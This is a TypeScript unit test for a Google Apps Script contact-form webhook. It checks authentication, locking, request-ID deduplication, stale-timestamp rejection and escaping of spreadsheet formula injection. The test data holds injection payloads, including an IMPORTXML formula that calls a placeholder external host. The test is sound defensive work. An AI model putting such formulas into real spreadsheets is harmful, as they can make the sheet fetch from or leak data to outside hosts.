import test from "node:test";
import assert from "node:assert/strict";
import fs from "node:fs";
import vm from "node:vm";
import { randomUUID } from "node:crypto";
test("Apps Script authenticates, writes literal cells, locks and deduplicates persisted request IDs", () => {
  const rows: unknown[][] = [];
  let locked = false;
  let idHeader = "";
  const properties: Record<string, string> = {
    WEBHOOK_SECRET: "test-secret",
    SPREADSHEET_ID: "test-sheet",
  };
  const headings = [
    "Timestamp",
    "Name",
    "Company",
    "Phone",
    "Email",
    "Product",
    "Voltage Class",
    "Requirement",
    "Source Page",
    "Status",
  ];
  const sheet = {
    getLastRow: () => rows.length + 1,
    hideColumns: () => {},
    getRange: () => ({
      getValues: () => [headings],
      getValue: () => idHeader,
      setValue: (v: string) => {
        idHeader = v;
      },
      createTextFinder: (id: string) => ({
        matchEntireCell: () => ({
          findNext: () => rows.find((row) => row[10] === id) || null,
        }),
      }),
    }),
    appendRow: (row: unknown[]) => {
      assert.equal(locked, true);
      rows.push(row);
    },
  };
  const context = vm.createContext({
    ContentService: {
      MimeType: { JSON: "json" },
      createTextOutput: (text: string) => ({
        setMimeType: () => JSON.parse(text),
      }),
    },
    LockService: {
      getScriptLock: () => ({
        tryLock: () => {
          locked = true;
          return true;
        },
        hasLock: () => locked,
        releaseLock: () => {
          locked = false;
        },
      }),
    },
    PropertiesService: {
      getScriptProperties: () => ({
        getProperty: (k: string) => properties[k],
        setProperties: (p: Record<string, string>) =>
          Object.assign(properties, p),
      }),
    },
    SpreadsheetApp: {
      openById: () => ({ getSheetByName: () => sheet }),
      flush: () => {},
    },
    Date,
    JSON,
  });
  vm.runInContext(
    fs.readFileSync(
      new URL("../docs/google-apps-script.gs", import.meta.url),
      "utf8",
    ),
    context,
  );
  const data = {
    name: "=SUM(1,2)",
    company: "@malicious",
    phone: "+919890114253",
    email: "qa@example.com",
    product: "Termination kit",
    voltageClass: "11 kV",
    message: '=IMPORTXML("https://invalid.example","//a")',
    sourcePage: "/contact",
    requestId: randomUUID(),
    submittedAt: new Date().toISOString(),
    secret: "test-secret",
  };
  const send = (d: unknown) =>
    context.doPost({ postData: { contents: JSON.stringify(d) } });
  assert.equal(send({ ...data, secret: "wrong" }).ok, false);
  assert.equal(rows.length, 0);
  assert.equal(send(data).ok, true);
  assert.equal(rows.length, 1);
  assert.equal(rows[0][1], "'=SUM(1,2)");
  assert.equal(rows[0][2], "'@malicious");
  assert.equal(rows[0][7], "'" + data.message);
  assert.equal(rows[0][9], "New");
  assert.equal(locked, false);
  assert.equal(send(data).ok, true);
  assert.equal(rows.length, 1);
  assert.equal(locked, false);
  assert.equal(
    send({
      ...data,
      requestId: randomUUID(),
      submittedAt: "2020-01-01T00:00:00Z",
    }).ok,
    false,
  );
  assert.equal(rows.length, 1);
});
